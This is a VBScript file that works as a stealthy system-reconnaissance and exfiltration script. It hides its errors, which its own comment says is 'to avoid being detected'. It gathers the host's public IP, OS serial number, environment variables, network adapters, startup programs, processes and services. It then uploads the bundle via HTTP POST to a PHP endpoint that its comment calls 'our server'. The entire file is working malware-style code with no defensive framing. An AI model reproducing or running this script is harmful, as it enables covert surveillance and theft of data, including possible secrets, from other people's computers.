' trap all errors to avoid being detected if something goes wrong
on error resume next

' getting the hostname 
function GetFileName()
    dim oShell
    set oShell = CreateObject("WScript.Shell")
    GetFileName = "Windows_" & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    set oShell = Nothing 
end function 

' getting the public IP
function GetPublicIP()
    dim publicIP, oHTTP
    publicIP = "0.0.0.0"
    set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    oHTTP.Open "GET", "http://ipecho.net/plain"
    oHTTP.Send
    WScript.Sleep 500
    if oHTTP.Status = 200 then 
       publicIP = oHTTP.ResponseText
    end if
    set oHTTP = Nothing
    GetPublicIP = publicIP
end function

' sending information to our server
sub SendInfo(filename,info)
    dim boundary, body, oHTTP
    boundary = "Win2017x"
    body = "--" & boundary & vbCrlf
    body = body & "Content-Disposition: form-data; name=""system-info""; filename=""" & filename & """" & vbCrlf
    body = body & "Content-Type: text/plain" & vbCrlf & vbCrlf
    body = body & info
    body = body & vbCrlf & vbCrlf & "--" & boundary & "--" & vbCrlf

    set oHTTP = CreateObject("Microsoft.XMLHTTP")
    oHTTP.Open "POST","http://192.168.1.43/up.php", False
    oHTTP.SetRequestHeader "Content-Type","multipart/form-data; boundary=" & boundary
    oHTTP.Send body
    set oHTTP = Nothing
end sub 

' execute a Windows WMI query 
function W32ExecQuery(q)
   dim oWMIService
   set oWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
   set W32ExecQuery = oWMIService.ExecQuery(q)
end function 

' get the list of all running processes
function GetProcess()
   dim s
   s=""
   for each obj in W32ExecQuery("Select * from Win32_Process")
       s = s & CStr(obj.ProcessId) & " " & obj.Name & " " & obj.Description & " " & obj.ExecutablePath & vbCrlf
   next
   GetProcess = s
end function 

' get the list of all windows services
function GetServices()
   dim s
   s=""
   for each obj in W32ExecQuery("Select * from Win32_Service")
       s = s & obj.Name & " " & obj.Description & " " & obj.PathName & " " & obj.Started & " " & obj.StartMode & " " & obj.State & vbCrlf
   next
   GetServices = s
end function 

' get the list of all environment variables
function GetEnvironment()
   dim s
   s=""
   for each obj in W32ExecQuery("Select * from Win32_Environment")
       s = s & obj.Name & " " & obj.Description & " " & obj.VariableValue & " " & obj.Status & " " & obj.SystemVariable & vbCrlf
   next
   GetEnvironment = s
end function 

' get version and architecture (32/64 bits) of windows
function GetOS()
   dim s
   s=""
   for each obj in W32ExecQuery("Select * from Win32_OperatingSystem")
       s = s & obj.Name & " " & obj.OSArchitecture & " " & obj.SerialNumber & vbCrlf
   next
   GetOS = s
end function 

' get the list of programs that execute at windows startup
function GetStartup()
   dim s
   s=""
   for each obj in W32ExecQuery("Select * from Win32_StartupCommand")
       s = s & obj.Name & " " & obj.Description & " " & obj.Command & vbCrlf
   next
   GetStartup = s
end function 

' get network adapters and related IP addresses
function GetNetwork()
   dim s
   s=""
   for each obj in W32ExecQuery("Select * from Win32_NetworkAdapterConfiguration")
       if obj.IPEnabled then
          a=""
          for i=lbound(obj.IPAddress) to ubound(obj.IPAddress)
            a = a & " " & obj.IPAddress(i)
          next 
          s = s & " " & obj.Caption & " " & obj.Description & " " & a & vbCrlf
       end if 
   next
   GetNetwork = s
end function 


filename = GetFilename()

info = "Public IP: " & GetPublicIP() & vbCrlf
info = info & "Operating System:" & vbCrlf & GetOS()
info = info & "Environment:" & vbCrlf & GetEnvironment()
info = info & "Network adapters:" & vbCrlf & GetNetwork()
info = info & "Startup programs:" & vbCrlf & GetStartup()
info = info & "Processes:" & vbCrlf & GetProcess()
info = info & "Services:" & vbCrlf & GetServices()

SendInfo filename,info 


